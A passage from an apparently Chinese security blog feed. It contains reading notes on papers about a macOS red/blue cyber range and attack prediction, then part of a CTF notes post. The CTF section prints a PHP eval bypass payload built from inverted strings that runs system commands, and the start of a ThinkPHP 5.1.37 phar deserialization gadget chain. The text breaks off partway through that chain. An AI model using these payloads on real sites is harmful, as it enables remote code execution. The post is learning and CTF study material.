1day，有很多都是边学边查边理解边写，也许还有很多理解有误的地方，等以后精进了之后再回来读和反思，这也是记录的目的之一。只希望自己能够坚持下来，一定能有收获！加油🤩</p>]]></content>
      
      
      <categories>
          
          <category> Vulnerability Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Supply Chain Attack </tag>
            
            <tag> 1day </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - POSTER: Construct macOS Cyber Range for Red/Blue Teams</title>
      <link href="/2021/12/07/POSTER%20-%20Construct%20macOS%20Cyber%20Range%20for%20Red%20-%20Blue%20Teams/"/>
      <url>/2021/12/07/POSTER%20-%20Construct%20macOS%20Cyber%20Range%20for%20Red%20-%20Blue%20Teams/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：YH Chen, YD Lin, CK Chen, CL Lei</em></p><p><em>原文标题：POSTER: Construct macOS Cyber Range for Red/Blue Teams</em></p><p><em>原文链接：<a href="https://dl.acm.org/doi/abs/10.1145/3320269.3405449">https://dl.acm.org/doi/abs/10.1145/3320269.3405449</a></em></p><p><em>原文来源：ASIA CCS 2020</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="0x01-Intro"><a href="#0x01-Intro" class="headerlink" title="0x01 Intro"></a>0x01 Intro</h2><p>这是一篇发布在ASIA CCS 2020的POSTER，作者聚焦于现今越来越多恶意应用程序和APT攻击将MacOS作为攻击目标这一情况展开研究。造成这一情况的原因在读者看来有二，一是MacOS的普及，这主要是M1的高性能表现吸引了很多新用户转向MacOS；二是安全行业相关从业人员也有使用MacOS的习惯，最近几年这些安全行业从业人员也成为了APT组织的攻击目标，前段时候才看到了一个APT组织在推特养号，然后发布破解了的、号称“无后门”的安全方面的工具以侵入安全行业从业人员私人电脑的攻击手段。</p><p>综上，作者观察到目前研究工作很少讨论在MacOS上的攻击和防御技术，包括攻击方法、防护手段以及审查工具。所以作者便尝试构建一个用于评估红队和蓝队的MacOS网络靶场，以刺激更多关于MacOS威胁分析的研究创新。</p><h2 id="0x02-Cyber-Range"><a href="#0x02-Cyber-Range" class="headerlink" title="0x02 Cyber Range"></a>0x02 Cyber Range</h2><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/08329f62-83d3-4597-9efb-56a2d849c77c.png"></p><p>上图为网络靶场的结构，主要由三个部分构成。首先，作者建立了一个攻防关联图，它系统地总结了MacOS中可能存在的攻击和防御技术，该图的目的是描述MacOS领域内的恶意软件/APT事件、攻击技术、检测工具和分析工具之间的所有关系。其次，作者开发了一个通用的RAT用于红队模拟攻击，红队可以发动攻击、记录攻击，并使用该工具将攻击映射至ATT&amp;CK矩阵中。第三，作者通过开源工具开发了一个蓝队用于检测和取证评估的工具包。蓝队可以利用这个工具包生成的记录（日志、告警等），以识别恶意行为并标记ATT&amp;CK ID，最后对攻击情况进行评估。通过结合这三部分，作者处理红队日志和蓝队报告，最后生成一个全面的攻防关联图，让用户能够轻松识别不同参与方之间的关系。</p><h3 id="攻防关联图"><a href="#攻防关联图" class="headerlink" title="攻防关联图"></a>攻防关联图</h3><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/fc0563ee-953d-4b80-9f1b-cd8cba4d94d0.png"></p><p>攻防关联图的核心是ATT&amp;CK矩阵，这个矩阵相信大家多少都了解过，这里不多赘述。作者在此基础上构建了一个攻防关联图，用于评估红队和蓝队。上图为攻防关联图的一个样例图，可以看到其根本目的还是为了描述攻击和防御技术之间的关系。对于攻击方（红队），必须要根据ATT&amp;CK矩阵来确定攻击过程中所涉及的攻击技术；对于防御方，则是需要找到行之有效的检测工具和取证工具，并整理出这些工具产生的记录（如事件、登录记录等）。如果这些记录中能够对应上攻击手段可能导致产生的记录，则在攻击技术和记录中添加关联，例如文件操作事件可以与T1105远程文件复制技术产生关联。对于MacOS来说有很多可以被检测工具和取证工具所留下来的记录，包括系统日志、钥匙串、通用日志等。根据这些记录，便可以追踪攻击者的活动。</p><p>在读者看来，作者所提出的这种关联图其实并不局限于MacOS，但需要限定场景使用，采用该关联图有几个优点。一是从红队的角度来看，该图总结了攻击方会使用到的一些技术，安全从业者便能够通过观察从这个角度出发常见的攻击技术，以实现更好的防护；二是从蓝队的角度出发，检测工具和取证工具及其对应能够产生的记录则展示了这些工具的能力，对于安全从业者来说可以按需选择和部署这些工具。</p><h3 id="红队角度-蓝队角度"><a href="#红队角度-蓝队角度" class="headerlink" title="红队角度/蓝队角度"></a>红队角度/蓝队角度</h3><p>作者在开发红队仿真工具时，采用了模块化的方式进行构建，同时在最新的MacOS上进行测试，以确保其有效性。对于整个模块化的流程来说，保证其有效性其实也就是保证对应攻击模块的时效性。</p><p>在蓝队角度，作者调查了几个著名的蓝队用的取证工具，并总结了这些工具能够提供的记录，然后将其整合，以形成蓝队工具包。按照阶段划分，作者提供的蓝队工具包包括了两个阶段：1)信息收集阶段；2)恶意行为检测阶段。前一阶段主要是收集攻击过程中的动态信息（采集自动态监控工具）和静态信息（采集自静态取证工具），然后反馈至后一阶段，以识别恶意行为并标记ATT&amp;CK ID。</p><h2 id="0x03-Evaluation"><a href="#0x03-Evaluation" class="headerlink" title="0x03 Evaluation"></a>0x03 Evaluation</h2><p>作者利用其红队仿真工具构建了一整个APT攻击流程，并使用其蓝队工具包来检测。</p><p>攻击开始，红队首先利用CVE-2018-6574在Github上建立一个恶意包。在得到这个恶意包后，仿真工具被执行，并将自身复制为用户主目录下的一个隐藏目录。同时，它还将添加一个plist文件，以注册一个用户级的LaunchAgent。然后，它会通过一个socket连接到对应的C2服务器，红队便能够利用shell命令来收集主机上的敏感信息。同时，它还会扫描SSH配置文件，并向沦陷主机中添加自己的公钥。随后，红队通过进程发现、屏幕监控及特权提升等手段，注册一个系统级的LaunchDaemon，便能够以root身份进行更高权限的操作了。</p><p>下表为评估结果，列出了上述攻击流程中会用到的技术，以及蓝队工具包的检测结果。从结果不难看出，蓝队的检测结构从很大程度上依赖于过滤规则的完整性和可用性。因此，不支持的部分主要是由于现有的检测规则倾向于发现阶段，而非实际发生恶意行为阶段所造成的。尽管作者在系统日志文件中记录了尽可能多的系统信息，但在初始低权限阶段和权限提升阶段，是很难区分恶意记录和正常记录的，作者将这个问题作为其未来研究的主要工作之一。</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/316b72aa-8e6a-4b22-9504-614525b54f0d.png"></p><h2 id="0x04-Conclusion"><a href="#0x04-Conclusion" class="headerlink" title="0x04 Conclusion"></a>0x04 Conclusion</h2><p>总的来说，作者打算抛砖引玉以引起研究人员对于MacOS攻防方面的研究兴趣。诚然现在很多很多安全设备都是针对Windows或是Linux的，这是实际生产环境决定的。但是MacOS作为大量安全从业者所使用的设备，在其之上的攻防是不能够忽视的。读者认为作者可能想表达的是：也许系统是安全的，但是操作系统的管理员所使用的PC并不一定。那些重重布防难以攻破的系统，攻击者完全可以不从正面突破，转而攻击那些操作系统的人，最终也能达到相同的目的。因此，MacOS上的攻防也是值得注意和研究的！</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASIA CCS 2020 </tag>
            
            <tag> Attack &amp; Defense </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - A Survey on Methodologies for Multi-Step Attack Prediction</title>
      <link href="/2021/11/16/A%20Survey%20on%20Methodologies%20for%20Multi-Step%20Attack%20Prediction/"/>
      <url>/2021/11/16/A%20Survey%20on%20Methodologies%20for%20Multi-Step%20Attack%20Prediction/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：S Ingale, M Paraye</em></p><p><em>原文标题：A Survey on Methodologies for Multi-Step Attack Prediction</em></p><p><em>原文链接：<a href="https://ieeexplore.ieee.org/abstract/document/9171106">https://ieeexplore.ieee.org/abstract/document/9171106</a></em></p><p><em>原文来源：ICISC 2020</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>首先需要知道的概念是Multi-Step，也叫Multi-Stage，相信对cs熟悉的朋友应该都能明白所谓step或者stage指的是这一类型的攻击通常是多步走，多个阶段进行的，不是一次性的。对于这类攻击，阶段性的成果只是达成最终目标的一个路径，在攻击者实现最终目标之前这些阶段性的攻击可能或多或少能够被安全设备捕捉到，但像传统IDS这类防御措施是不足以完整挖掘出攻击路径并及时反馈出攻击者的下一步行动的。于是作者着眼于这类攻击检测方法的性能指标，回顾最常用的用于预测多步骤攻击的方法，以指导研究人员为不同的多步骤攻击场景选择最为合适的方法。</p><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><p>早期用于检测传统网络攻击的方法已经不太适用于检测和预测多步骤攻击。目前针对多步骤攻击的检测和预测通常是通过结合几个特定的事件来进行的，但网络中我们不可能保证所有运行的服务都是绝对安全的。这里涉及到一个取舍，到底是要安全还是用户体验。于是考虑到这个局限性，问题就转变为制定一个限制程度可接受的多步骤攻击检测和预测方法。</p><p>这个问题的关键挑战在于如何预测复杂多变的攻击手法，通常来说这类攻击是由多个不同步骤组成的用于实现攻击者最终目标的一系列攻击。但由于网络流量数据的复杂性，攻击流量与正常流量混杂难以区别，从海量数据中筛查出攻击流量就犹如海底捞针了。除此之外，还有一些特定环境和场景下才能发动的攻击，这种情况作者称之为稀有数据(rare-data)挑战。在这种情况下，训练一个模型来检测这种数量罕有的攻击是一件几乎无法完成的事。</p><p>除了上述挑战以外，在预测多步骤攻击时会遇到的另一个挑战/阻碍是极度不平衡的数据集。这主要是因为要做多步骤攻击检测和预测，首先需要找到攻击阶段之间的关联性或相似性，更重要的是不仅要知道攻击类型，还要知道攻击的性质和目的。一旦缺失了一部分信息，那么构建起来的检测模型效果一定是不太好的。所以这种问题也被称为是“数据缺失”问题，在这种情况下，需要先对传入的未知攻击进行分类，然后才能够输入模型进行训练。</p><h2 id="Algorithms-Mechanisms"><a href="#Algorithms-Mechanisms" class="headerlink" title="Algorithms/Mechanisms"></a>Algorithms/Mechanisms</h2><pre><code>以下涉及到的具体论文方法请至原文中查看</code></pre><h3 id="Hidden-Markov-Models"><a href="#Hidden-Markov-Models" class="headerlink" title="Hidden Markov Models"></a>Hidden Markov Models</h3><p>隐马尔可夫模型（HMM）是目前应用于多步骤攻击预测的众多模型中使用最广泛的，HMM模型中的存在着一定数量的隐藏态，但不论如何每一个状态都会产生一个观察值。对于试验者来说，只有那些由特定状态所产生的观察值是值得注意的。由此，该模型所谓的状态很容易地能够和多步骤攻击中的每一步进行关联，这也是该模式适用于多步骤攻击预测的原因。通过该模型，能够根据先验的攻击序列来确定未知攻击所属的类型象限。</p><p>虽然HMM有着上述优点，但其用来预测攻击序列的viterbi算法需要大量的计算时间和内存消耗，序列长度与所需时间成正比。通常来说，较大但不是巨大的序列和特征集比较适用。除此之外，训练HMM模型还有一个问题是需要合理调参，以使得模型能够快速收敛，减少迭代次数。</p><h3 id="Artificial-Neural-Networks"><a href="#Artificial-Neural-Networks" class="headerlink" title="Artificial Neural Networks"></a>Artificial Neural Networks</h3><p>人工神经网络（ANN）能够根据一些标记数据或聚类算法来理解输入的数据，一个ANN是一个个神经元的相互连接，神经元结合输入和相关权重进行计算，将结果反馈给激活函数，以确定信号是否能够通过。举一个实例，将ANN引入至IDS中，它从网络入侵数据集中提取特征，并预测攻击类型。关于神经网络的学习过程这里不再赘述，归根到底是要让其收敛。</p><p>ANN在实际生产环境已经被证明是能够成功检测和预测攻击的了，它能够通过监测和从数据集中学习来做到在正常或异常的基础分类上对攻击进行更高层次的分类。但ANN的缺点也十分明显，虽然其能够处理大量数据，但其进能够分析现有数据并作出判断，并不适用于实时数据处理，即没有很好的办法预测实时入侵。</p><h3 id="Bayesian-Networks"><a href="#Bayesian-Networks" class="headerlink" title="Bayesian Networks"></a>Bayesian Networks</h3><p>贝叶斯网络是基于条件概率原理工作的一个概率模型，本质上来说贝叶斯网络是一个包含节点和边的有向无环图，节点代表随机变量，而边代表这些变量之间的条件独立性。所谓条件概率，指的是一个节点在给定时间处于特定状态的概率，而每个贝叶斯网络中一定存在一个父节点和子节点，子节点的概率取决于父节点。</p><p>以一个实际例子来说明：利用贝叶斯网络建立的贝叶斯分类器能够识别正常和恶意TCP流量中出现的具有不同概率的特征，然后通过一个预定义的训练模型，将流量分类为正常或恶意。贝叶斯最大的优点就在于其易于实现，但效果仅仅只是赶得上别的方法。</p><h3 id="Machine-Learning-Techniques"><a href="#Machine-Learning-Techniques" class="headerlink" title="Machine Learning Techniques"></a>Machine Learning Techniques</h3><p>这一部分就比较大了，分大类可以分为监督和无监督甚至半监督方法。作者仅讨论了两种方法：</p><ol><li>Support Vector Machine<br>支持向量机（SVM）是一种监督模型，主要用于数据分类，传统的SVM适用于带标签的数据。但对于无标签的数据，可以利用One-Class SVM来解决。除此之外，传统SVM可以考虑使用Robust-SVM来替换模型以追求更加稳定的实验效果。<br>SVM已被证明是用于入侵检测和预测最为成功的数据挖掘技术，它与神经网络和决策树相比，具有更低的误报率和更高的预测精准度，同时对于输入数据也没有那么多限制要求。但SVM的缺点是其不能够有效地实时处理数据，除此之外它更多地适用于数字数据，而对于非数字数据的处理效果并不佳。</li><li>Decision Trees<br>决策树是一种能够绘制决策及其结果的树状模型，在决策树中，内部节点代表了对属性的测试，而分支代表了该测试的结果。简单来说，决策树能够给出不同情况下（不同路径下）的预期值。<br>决策树通常通过需要寻找显著特征来分析数据集并从中寻找相对应的模式来预测攻击，正因如此，它能够处理大型数据集。它能从父节点到子节点的路径规则来对攻击进行分类，这意味着决策树能够有助于对网络入侵进行实时监控。</li></ol><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>最后，简单看看作者罗列出的不同方法的对比</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/a49e53fc-00e3-4fef-8f80-0c0093066d34.png"></p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/0aa4213a-9807-43d9-a862-6bc42aa3e7b3.png"></p><p>写在最后，作者表明其上述讨论的所有算法都没有充分解决“稀有数据”和“缺失数据”的问题，这两个问题会在极大程度上误导预测的结果。在“稀有数据”问题的情况下，方法可能会倾向于数据集中发生次数最多的攻击类型；在“缺失数据”问题的情况下，由于多步骤攻击的连贯性，很有可能预测没办法进行下去。此外，更多的研究倾向于对于已有的入侵数据集进行研究，而非是真实、实时的网络环境中的数据。因此，未来应当重点关注上述问题，并解决。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Survey </tag>
            
            <tag> Multi-Step Attack Prediction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - A network attack path prediction method using attack graph</title>
      <link href="/2021/11/09/A%20network%20attack%20path%20prediction%20method%20using%20attack%20graph/"/>
      <url>/2021/11/09/A%20network%20attack%20path%20prediction%20method%20using%20attack%20graph/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文作者：X Liu</em></p><p><em>原文标题：A network attack path prediction method using attack graph</em></p><p><em>原文链接：<a href="https://link.springer.com/article/10.1007/s12652-020-02206-5">https://link.springer.com/article/10.1007/s12652-020-02206-5</a></em></p><p><em>原文来源：JAIHC 2020</em></p><p><em>笔记作者：outx</em></p></blockquote><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>正如之前笔记中所说过的，现在的网络攻击行为已经由传统单一简单的攻击机制转变为多阶段多步骤复杂的攻击机制。这里举一个简单的例子，Zeus僵尸网络通过扫描检测、溢出攻击、感染目标、传播病毒及窃取数据五个攻击步骤/攻击阶段发动攻击，这会造成严重且恶劣的影响。简单来说，攻击路径预测的目的是通过告警关联分析技术分析攻击行为，揭露这些攻击行为背后隐藏的逻辑，进而构建攻击场景，最终推断出攻击者的后续攻击步骤，实现及时发现主动防御。</p><p>攻击路径预测的关键主要分为两部分：</p><ol><li>了解当前的攻击行为</li><li>预测攻击者可能会采用的攻击路径</li></ol><p>基于上述想法，作者提出了一种基于攻击图的攻击路径预测方法，并尝试用攻击图来描述入侵行为的节点之间的传递关系，映射出从某一主机或漏洞进行攻击的最大可能性，进而网络各攻击路径下的入侵情况，并根据检测结果构建网络攻击节点路径检测模型。</p><h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><pre><code>文中涉及大量公式推理，读者仅作简要概述，如感兴趣请至原文中查看</code></pre><p><strong>网络攻击节点路径检测</strong><br>在构建网络攻击节点路径检测模型的过程中，首先基于攻击图理论定义了网络攻击图，通过检测攻击者在当前时间节点的权限状态，获取网络连接矩阵，得到攻击者使用的漏洞、攻击效果和攻击条件的描述，进而构建网络攻击节点路径检测模型。</p><p><strong>攻击意图预测和优化</strong><br>在优化和预测网络中异常信息的攻击意图的过程中，根据主机之间的连接关系定义攻击路径图，计算攻击意图的可达性和实现的可能性，得到攻击意图的最短路径，进而优化和预测网络中异常信息的攻击意图</p><p><strong>基于入侵概率的网络攻击节点路径检测模型</strong><br>在构建网络攻击节点路径检测模型的过程中，根据预定义的攻击标准，对网络中存在的漏洞的各个属性进行赋值，检测攻击者能够成功利用漏洞进行入侵的概率、攻击者获得高权限的概率以及实现攻击意图的概率，最后得攻击者在网络中各个攻击路径下能够进行入侵的最大可能性的那一条攻击路径，进行后续检测（当然这部分是建立在网络攻击节点路径检测的基础上实现的）。</p><h2 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h2><p>作者为了验证想法，构建了一套环境用于实现，拓扑图如下</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/398f0df6-4859-4ed8-a21a-dcca85b35d51.png"></p><p>外网用户（攻击者）可以通过互联网访问该网络，实验网络总共分为四个区域：DMZ区、子网1、子网2、子网3。访问控制设置如下：DMZ区包含Web服务器和Email服务器，由防火墙1保护并与互联网互联，且只能访问主机1、子网2的文件服务器和子网3的数据库服务器；子网1的主机1可以访问子网2和子网3的所有机器，主机3只能访问主机1和数据库服务器，主机2只能访问主机3；工作站2可以访问数据库服务器和文件服务器。</p><p>然后作者与另外两种模型检测到的漏洞风险、节点攻击路径检测的精确度和可靠性进行了比较，最后还对比了其误报率，总体情况如下图</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/527e9887-52dd-44af-bfae-20fdb36e4222.png"></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>作者提出了一种基于攻击图的攻击意图预测方法，也可以称之为基于攻击图的攻击路径预测方法。该方法用攻击路径图来描述入侵行为节点之间的传递关系，从而映射出从主机/漏洞进行攻击的最大可能性，进一步梳理得到网络中各攻击路径下的入侵情况，并根据这个情况构建网络攻击节点路径检测模型。</p><p>读者在读完整篇文章后，主要有一个问题：在描述攻击图定义那部分，作者写道：“在网络节点攻击路径检测的过程中，路由器会以一定的概率检测自己的地址信息，并计算出路由器检测数据包信息的概率，从而根据这个计算结果确定网络入侵中的攻击路径”。对于这部分，读者比较迷惑的是为什么路由器检测自己地址信息结合数据包中的信息可以确定网络入侵的攻击路径，不应该是从一些异常数据包中排查出路由信息进而确定攻击路径么，这里的描述比较迷惑。但总的来说，这篇文章从网络节点关联攻击路径出发，重点关注可被攻击者利用到的漏洞/主机，对其进行评估，进而确定各条攻击路径的可能性，是一个不错的想法。</p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAIHC 2020 </tag>
            
            <tag> Attack Path Prediction </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NS - CTF Notes</title>
      <link href="/2021/11/08/CTF%20Notes/"/>
      <url>/2021/11/08/CTF%20Notes/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>从零开始的CTF复健练习</em></p><p><em>持续更新直到不学习安全那天</em></p><p><em>笔记作者：outx</em></p><p><em>最后一次更新于2021-11-08</em></p></blockquote><h2 id="无字母、数字、-的eval执行"><a href="#无字母、数字、-的eval执行" class="headerlink" title="无字母、数字、_的eval执行"></a>无字母、数字、_的eval执行</h2><p><code>index.php</code>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">20</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not Allowed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题很常规，只是限制长度搞的我很难受，一开始只想到了用<code>$&#123;&#125;</code>构造<code>$_GET</code>，但是由于长度限制，想拿flag必须要构造两次，然后分别填入函数名和参数，光是构造函数<code>$&#123;~%22%A0%B8%BA%AB%22&#125;[%AA]();</code>已经占用了16个字符，在4个字符里指定<code>flag.php</code>是不现实的。</p><p>在hxd的提示下，可以直接取反构造函数和取反构造参数，于是构造<code>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code>，翻译回来是system(&quot;ls /&quot;)的意思，这里注意<strong>可以不带引号玩</strong></p><p>用于生成payload的php脚本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># eval，无数字字母下划线执行命令</span></span><br><span class="line"><span class="variable">$func</span> = urlencode(~<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = urlencode(~<span class="string">&quot;ls /&quot;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;(~<span class="subst">$func</span>)(~<span class="subst">$cmd</span>);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure><h2 id="利用phar触发TP5-1-37的反序列化"><a href="#利用phar触发TP5-1-37的反序列化" class="headerlink" title="利用phar触发TP5.1.37的反序列化"></a>利用phar触发TP5.1.37的反序列化</h2><p>源码：s=index/index/hello</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;这部分是前端&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$hello</span> = base64_encode(<span class="string">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>])||<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            parse_str(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>],<span class="variable">$haha</span>);</span><br><span class="line">            extract(<span class="variable">$haha</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;hello.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = base64_decode(<span class="variable">$hello</span>);</span><br><span class="line">        file_put_contents(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (file_get_contents(<span class="variable">$a</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个任意文件读取+一个指定后缀名文件的写入。通过写入phar包，利用phar://读取触发反序列化，结合TP5.1.37的反序列化漏洞达到命令执行的目的。</p><p>tp5137.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;dir&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span 